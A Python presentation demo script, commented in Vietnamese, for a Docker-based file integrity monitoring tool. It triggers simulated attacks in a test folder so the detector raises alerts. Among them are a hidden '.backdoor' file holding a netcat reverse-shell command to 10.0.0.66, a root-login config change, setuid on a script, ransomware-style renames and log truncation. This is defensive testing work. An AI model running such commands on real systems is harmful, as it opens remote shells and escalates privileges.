# -*- coding: utf-8 -*-
"""Demo trực tiếp từng bước khi thuyết trình. Chạy trên máy host, trong thư mục dự án (stack Docker đã chạy):
    python tools/demo_live.py            # đủ 8 bước; mỗi thao tác hiện lệnh + ý nghĩa, nhấn Enter mới chạy
    python tools/demo_live.py --short    # bản rút gọn khi thiếu thời gian: bước 1, 3, 4, 6, 8
    python tools/demo_live.py --reset    # xóa dữ liệu cũ (down -v), dựng lại (up -d --build) rồi mới demo
    python tools/demo_live.py --auto     # chạy thử một mạch, không chờ Enter
Khi chờ Enter: gõ s = bỏ qua thao tác này, q = dừng.
Mở song song:  docker compose logs -f monitor   (nhật ký thời gian thực)   và   http://127.0.0.1:5000 (dashboard)"""
import argparse, json, os, re, subprocess, sys, textwrap, time, webbrowser
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
URL = os.environ.get('FIM_DASHBOARD_URL', 'http://127.0.0.1:5000').rstrip('/')
DB = 'data/fim.db'
os.system('')                                         # bật mã màu ANSI trên console Windows
for st in (sys.stdout, sys.stderr):
    try: st.reconfigure(encoding='utf-8', errors='replace')
    except (AttributeError, ValueError): pass
RED, YEL, GRN, CYA, DIM, BLD, END = '\033[91m', '\033[93m', '\033[92m', '\033[96m', '\033[2m', '\033[1m', '\033[0m'
LEVEL_COLOR = {'HIGH': RED, 'MEDIUM': YEL, 'LOW': GRN}

# Lý do trong code (tiếng Anh) -> tiếng Việt + số điểm, đúng bảng 14 dấu hiệu trong fim/rules.py; {x} = phần trong ngoặc
REASONS = [('timestamp moved backwards', 'lùi thời gian sửa (timestomp)', 4), ('file deleted', 'xóa file', 3),
           ('content changed', 'sửa nội dung', 2), ('file moved/renamed', 'đổi tên', 2), ('new file', 'tạo file mới', 1),
           ('permission changed', 'đổi quyền', 2), ('owner changed', 'đổi chủ sở hữu', 3),
           ('critical directory', 'thư mục quan trọng ({x})', 2), ('sensitive path', 'đường dẫn nhạy cảm', 3),
           ('executable/script file', 'file thực thi/script', 2), ('ransomware-like extension', 'đuôi kiểu ransomware', 4),
           ('hidden file', 'file ẩn', 2), ('extension changed', 'đổi đuôi file ({x})', 2),
           ('file truncated', 'làm rỗng file', 2), ('execute permission added', 'thêm quyền chạy', 3),
           ('setuid/setgid', 'bật setuid/setgid', 4), ('world-writable', 'ai cũng ghi được', 3),
           ('outside work hours', 'ngoài giờ làm việc ({x})', 1), ('mass change', 'thay đổi hàng loạt ({x})', 3),
           ('allowed by whitelist', "whitelist '{x}' cho phép → hợp lệ", 0),
           ('whitelist', "whitelist '{x}' bị bỏ qua vì có dấu hiệu tấn công", 0),
           ('timestamp updated', 'chỉ đổi thời gian sửa', 0)]

# Chạy trong container: chờ sự kiện mới (id > last) cho đến khi yên lặng `quiet` giây hoặc hết `limit` giây
WAIT = r'''
import json, sqlite3, sys, time
last, quiet, limit = int(sys.argv[1]), float(sys.argv[2]), float(sys.argv[3])
db = sqlite3.connect('%s'); db.row_factory = sqlite3.Row
q = ('SELECT e.id, e.event_type, e.path, e.old_path, e.risk_score, e.risk_level, e.verdict, e.details, a.id AS alert '
     'FROM events e LEFT JOIN alerts a ON a.event_id = e.id WHERE e.id > ? ORDER BY e.id')
rows, t0, seen = [], time.time(), 0
while time.time() - t0 < limit:
    new = db.execute(q, (rows[-1]['id'] if rows else last,)).fetchall()
    if new: rows += [dict(r) for r in new]; seen = time.time()
    elif rows and time.time() - seen >= quiet: break
    time.sleep(0.2)
print(json.dumps(rows))
''' % DB
SQL = "import sqlite3, sys; print(sqlite3.connect('%s').execute(sys.argv[1]).fetchone()[0])" % DB


def dc(*args, capture=True, check=True):
    # stdin=DEVNULL: docker exec không được đọc phím người thuyết trình gõ (Enter/s/q là của input())
    r = subprocess.run(['docker', 'compose', *args], cwd=ROOT, stdin=subprocess.DEVNULL, capture_output=capture,
                       encoding='utf-8', errors='replace')
    if check and r.returncode:
        sys.exit(f'{RED}Lỗi khi chạy: docker compose {" ".join(args)}{END}\n{(r.stderr or "").strip()}')
    return r if not check else r.stdout or ''


def ex(*args): return dc('exec', '-T', 'monitor', *args)
def sql(query): return ex('python', '-c', SQL, query).strip()
def short(p): return (p or '').split('test_folder/', 1)[-1]
def indent(text): return textwrap.indent(text.rstrip(), '   ')


def ask(args, msg='Nhấn Enter để chạy'):
    if args.auto: return ''
    try: a = input(f'{DIM}   ↵ {msg} (s = bỏ qua, q = dừng) {END}').strip().lower()
    except EOFError: a = 'q'
    if a == 'q': sys.exit('\nĐã dừng demo.')
    return a


def open_page(args, path, label):
    print(f'   {CYA}Dashboard → {label}: {URL}{path}{END}')
    if not args.no_browser: webbrowser.open(URL + path)


def reasons_vi(details):
    out = []
    for r in re.split(r', (?![^()]*\))', details or ''):        # không tách dấu phẩy nằm trong ngoặc
        vi, pts = next(((v, n) for k, v, n in REASONS if r.startswith(k)), (r, 0))
        m = re.search(r"\(([^)]*)\)|'([^']*)'", r)
        x = (m.group(1) or m.group(2)) if m else ''
        out.append(vi.format(x=x.replace(' files at once', ' file cùng lúc')) + (f' {BLD}+{pts}{END}' if pts else ''))
    return ' · '.join(out)


def show_events(rows):
    """In sự kiện mới; các sự kiện giống hệt nhau (vd 12 file .enc) gộp thành một dòng."""
    groups = []
    for r in rows:
        key = (r['event_type'], r['verdict'], r['risk_score'], bool(r['alert']), re.sub(r'\d+ files', 'n files', r['details'] or ''))
        if groups and groups[-1][0] == key: groups[-1][1].append(r)
        else: groups.append((key, [r]))
    for _, g in groups:
        r = g[0]
        if r['alert']: tag = f"{RED}{BLD}CẢNH BÁO #{r['alert']}" + (f" – #{g[-1]['alert']}" if len(g) > 1 else '') + END
        else: tag = f'{GRN}{BLD}HỢP LỆ (không cảnh báo){END}'
        names = sorted((short(x['path']) for x in g), key=lambda s: [int(t) if t.isdigit() else t for t in re.split(r'(\d+)', s)])
        where = names[0] if len(g) == 1 else f'{len(g)} file: {names[0]} … {names[-1]}'
        print(f"   {tag}  {LEVEL_COLOR.get(r['risk_level'], '')}{BLD}{r['risk_level']} · {r['risk_score']} điểm{END}"
              f"  {r['event_type']}  {where}")
        if r['old_path']: print(f"      đổi từ: {short(r['old_path'])}")
        print(f"      = {reasons_vi(r['details'])}  {DIM}→ tổng {r['risk_score']} điểm{END}")


def run_and_watch(cmd, expect_none=False):
    last = int(sql('SELECT COALESCE(MAX(id), 0) FROM events'))
    r = dc('exec', '-T', 'monitor', 'sh', '-c', cmd, check=False)
    if r.returncode: print(f'   {YEL}Lệnh báo lỗi: {(r.stderr or r.stdout).strip()}{END}')
    rows = json.loads(ex('python', '-c', WAIT, str(last), '1.5', '4' if expect_none else '10'))
    if rows: show_events(rows)
    elif expect_none: print(f'   {GRN}Không có sự kiện nào — đúng như mong đợi.{END}')
    else: print(f'   {YEL}Chưa thấy sự kiện nào.{END}')
    return rows


def action(args, no, title, meaning, cmd, expect_none=False):
    print(f'\n{BLD}{no}  {title}{END}')
    for m in meaning: print(f'   - {m}')
    print(f'   {DIM}${END} {cmd}')
    return [] if ask(args) == 's' else run_and_watch(cmd, expect_none)


def header(no, title):
    print(f'\n{CYA}{BLD}{"═" * 78}\n BƯỚC {no}. {title}\n{"═" * 78}{END}')


def summary(label):
    ev, al = sql('SELECT COUNT(*) FROM events'), sql('SELECT COUNT(*) FROM alerts')
    lv = sql("SELECT group_concat(severity || ' ' || n, ', ') FROM "
             "(SELECT severity, COUNT(*) n FROM alerts GROUP BY severity ORDER BY severity)")
    print(f'\n   {BLD}{label}: {ev} sự kiện, {al} cảnh báo{END}' + (f' ({lv})' if lv != 'None' else ''))


# ------------------------------------------------------------------ các bước demo (khớp lời thoại slide DEMO)
def step1(args):
    header(1, 'Baseline và giám sát thời gian thực')
    print('   Lúc khởi động, hệ thống băm SHA-256 mọi file trong phạm vi (baseline) rồi theo dõi thay đổi bằng inotify.')
    if ask(args, 'Nhấn Enter để xem nhật ký khởi động') == 's': return
    for line in dc('logs', '--no-color', 'monitor').splitlines():
        if re.search(r'baseline|Monitoring', line, re.I): print('   ' + line.split('|', 1)[-1].strip())
    print(indent(ex('python', 'main.py', 'scope')))


def step2(args):
    header(2, 'Phạm vi giám sát (scope theo thư mục hệ thống)')
    print('   4 thư mục: etc, bin là thư mục quan trọng (critical, +2 điểm); var/log và home là thư mục thường.')
    if ask(args, 'Nhấn Enter để mở trang Phạm vi giám sát') != 's': open_page(args, '/scope', 'Phạm vi giám sát')


def step3(args):
    header(3, 'Kịch bản 8 thao tác: 2 hợp lệ + 6 tấn công')
    W = 'test_folder'
    action(args, '3.1', 'Người dùng tạo ghi chú trong home', ['Thay đổi bình thường, điểm thấp → hợp lệ.'],
           f'echo "meeting notes" > {W}/home/user/todo.txt')
    action(args, '3.2', 'Ứng dụng ghi thêm một dòng log',
           ['Whitelist allow *.log: vẫn ghi vào lịch sử nhưng coi là hợp lệ, không cảnh báo.'],
           f'echo "$(date "+%F %T") INFO request ok" >> {W}/var/log/app.log')
    action(args, '3.3', 'Kẻ tấn công sửa cấu hình: bật đăng nhập root',
           ['File .conf trong etc: thư mục quan trọng + đường dẫn nhạy cảm (MITRE T1098.004).'],
           f'echo "PermitRootLogin yes" >> {W}/etc/config.conf')
    action(args, '3.4', 'Kẻ tấn công bật setuid cho script trong bin',
           ['Ai chạy file này cũng có quyền của chủ file → leo thang đặc quyền (MITRE T1548.001).'],
           f'chmod u+s {W}/bin/script.sh')
    action(args, '3.5', 'Kẻ tấn công tạo file ẩn (backdoor) trong home',
           ['Tên bắt đầu bằng dấu chấm → bị ẩn khi liệt kê thư mục (MITRE T1564.001).'],
           f'echo "nc -e /bin/sh 10.0.0.66 4444" > {W}/home/user/.backdoor')
    action(args, '3.6', 'Ransomware đổi tên README.txt thành README.txt.locked',
           ['Hệ thống nhận ra đây là ĐỔI TÊN (MOVED) nhờ mã băm giống nhau, không phải xóa + tạo (MITRE T1486).'],
           f'mv {W}/home/user/README.txt {W}/home/user/README.txt.locked')
    action(args, '3.7', 'Mã hóa hàng loạt: 12 file .enc trong vài giây',
           ['Từ 10 file thay đổi trong 60 giây → cộng thêm điểm "thay đổi hàng loạt".'],
           f'for i in 1 2 3 4 5 6 7 8 9 10 11 12; do echo "enc $i" > {W}/home/user/doc$i.txt.enc; done')
    action(args, '3.8', 'Xóa dấu vết: làm rỗng file log',
           ['app.log có whitelist allow *.log, nhưng làm rỗng file là dấu hiệu tấn công nên whitelist KHÔNG che được '
            '(MITRE T1070.002).'],
           f': > {W}/var/log/app.log')
    summary('Sau kịch bản 8 thao tác')


def step4(args):
    header(4, 'So mã băm: vì sao biết config.conf bị sửa')
    print('   Mã SHA-256 lưu trong baseline so với mã của file hiện tại: chỉ cần đổi 1 ký tự là mã khác hoàn toàn.')
    if ask(args, 'Nhấn Enter để so') == 's': return
    old = sql("SELECT sha256 FROM baseline WHERE path LIKE '%/etc/config.conf'")
    new = ex('sha256sum', 'test_folder/etc/config.conf').split()[0]
    print(f'   baseline : {GRN}{old}{END}\n   hiện tại : {RED}{new}{END}')
    print(f'   → {"KHÁC NHAU: nội dung file đã bị sửa" if old != new else "giống nhau: file chưa bị sửa"}')


def step5(args):
    header(5, 'Xóa file chương trình')
    action(args, '5', 'Kẻ tấn công xóa bin/script.sh để xóa dấu vết',
           ['Xóa file là loại thay đổi nặng nhất (+3), lại nằm trong bin.'], 'rm test_folder/bin/script.sh')


def step6(args):
    header(6, 'Dashboard: tổng quan, cảnh báo, lịch sử thay đổi')
    summary('Hiện tại')
    if ask(args, 'Nhấn Enter để mở Tổng quan') != 's': open_page(args, '/', 'Tổng quan')
    if ask(args, 'Nhấn Enter để mở Cảnh báo') != 's': open_page(args, '/alerts', 'Cảnh báo')
    if ask(args, 'Nhấn Enter để mở Lịch sử, lọc SUSPICIOUS') != 's':
        open_page(args, '/events?verdict=SUSPICIOUS', 'Lịch sử thay đổi (lọc SUSPICIOUS)')


def step7(args):
    header(7, 'Quản lý whitelist: bỏ qua file sao lưu *.bak')
    print('   Thêm rule ignore *.bak → file khớp rule không còn bị theo dõi, nên không sinh sự kiện.')
    if ask(args, 'Nhấn Enter để thêm rule') == 's': return
    cmd = 'python main.py whitelist add "*.bak" --kind ignore --note "file sao lưu"'
    print(f'   {DIM}${END} {cmd}\n' + indent(ex('sh', '-c', cmd)))
    open_page(args, '/whitelist', 'Whitelist')
    action(args, '7', 'Tạo file home/user/a.bak', ['Mong đợi: KHÔNG có sự kiện nào.'],
           'echo x > test_folder/home/user/a.bak', expect_none=True)


def step8(args):
    header(8, 'Thay đổi hợp lệ của quản trị viên: xác nhận và chấp nhận vào baseline')
    rows = action(args, '8', 'Quản trị viên thêm cấu hình NTP hợp lệ etc/ntp.conf',
                  ['File mới trong etc vẫn bị cảnh báo vì hệ thống không biết ai tạo → cần người xem xét.'],
                  'echo "server pool.ntp.org iburst" > test_folder/etc/ntp.conf')
    conf = int(sql("SELECT COALESCE(MAX(id), 0) FROM alerts WHERE path LIKE '%/etc/config.conf' AND status = 'NEW'"))
    ntp = next((r['alert'] for r in rows if r['alert']), None)
    print()
    if conf: print(f'   Cảnh báo config.conf (#{conf}) là tấn công thật → bấm {BLD}Xác nhận{END} (đã biết, đang xử lý).')
    if ntp: print(f'   Cảnh báo ntp.conf (#{ntp}) là thay đổi hợp lệ → bấm {BLD}Chấp nhận{END} (đưa vào baseline).')
    open_page(args, '/alerts', 'Cảnh báo')
    if ask(args, 'Bấm 2 nút trên dashboard rồi nhấn Enter, hoặc gõ a để script tự làm bằng lệnh') == 'a' or args.auto:
        cmds = ([f'python main.py ack {conf}'] if conf else []) + \
               (['python main.py accept --path test_folder/etc/ntp.conf', f'python main.py ack {ntp}'] if ntp else [])
        for cmd in cmds: print(f'   {DIM}${END} {cmd}\n' + indent(ex('sh', '-c', cmd)))
    for aid, name in ((conf, 'config.conf'), (ntp, 'ntp.conf')):
        if aid:
            s = sql(f'SELECT status FROM alerts WHERE id = {aid}')
            print(f'   Cảnh báo #{aid} ({name}): {GRN if s == "ACK" else YEL}{s}{END}')
    scan = ex('python', 'main.py', 'scan')
    print('   Quét lại so với baseline: ntp.conf ' + (f'{YEL}VẪN bị báo{END}' if 'etc/ntp.conf' in scan
                                                    else f'{GRN}không còn bị báo{END} (đã nằm trong baseline).'))


def preflight(args):
    if args.reset:
        print(f'{BLD}Đặt lại hệ thống: xóa dữ liệu cũ và dựng lại…{END}', flush=True)
        dc('down', '-v', capture=False); dc('up', '-d', '--build', capture=False)
    for _ in range(60):
        r = dc('logs', '--no-color', 'monitor', check=False)
        if r.returncode == 0 and re.search(r'Monitoring|polling', r.stdout or ''): break
        time.sleep(1)
    else: sys.exit(f'{RED}Container monitor chưa chạy. Hãy bật Docker Desktop rồi chạy: docker compose up -d --build{END}')
    hour = int(ex('date', '+%H').strip())
    print(f'{BLD}FIM – demo trực tiếp{END}   giờ trong container: {hour}h → '
          + (f'{YEL}ngoài giờ làm việc (7h–19h): mỗi thay đổi +1 điểm{END}' if not 7 <= hour < 19 else 'trong giờ làm việc'))
    n = int(sql('SELECT COUNT(*) FROM events'))
    if n:
        print(f'{YEL}Đã có {n} sự kiện từ lần chạy trước → số liệu sẽ cộng dồn, không khớp slide.\n'
              f'Nên dừng (q) rồi chạy: python tools/demo_live.py --reset{END}')
        ask(args, 'Nhấn Enter để vẫn tiếp tục')


def main():
    p = argparse.ArgumentParser(description='Demo trực tiếp FIM từng bước (chạy trên máy host)')
    p.add_argument('--short', action='store_true', help='chỉ bước 1, 3, 4, 6, 8')
    p.add_argument('--reset', action='store_true', help='docker compose down -v rồi up -d --build trước khi demo')
    p.add_argument('--auto', action='store_true', help='không chờ Enter (chạy thử)')
    p.add_argument('--no-browser', action='store_true', help='không tự mở trình duyệt')
    p.add_argument('--steps', help='chỉ chạy các bước này, vd 3,4')
    args = p.parse_args()
    steps = {1: step1, 2: step2, 3: step3, 4: step4, 5: step5, 6: step6, 7: step7, 8: step8}
    pick = [int(x) for x in args.steps.split(',')] if args.steps else [1, 3, 4, 6, 8] if args.short else list(steps)
    preflight(args)
    for k in pick: steps[k](args)
    summary('Kết thúc demo')


if __name__ == '__main__':
    try: main()
    except KeyboardInterrupt: print('\nĐã dừng demo.')
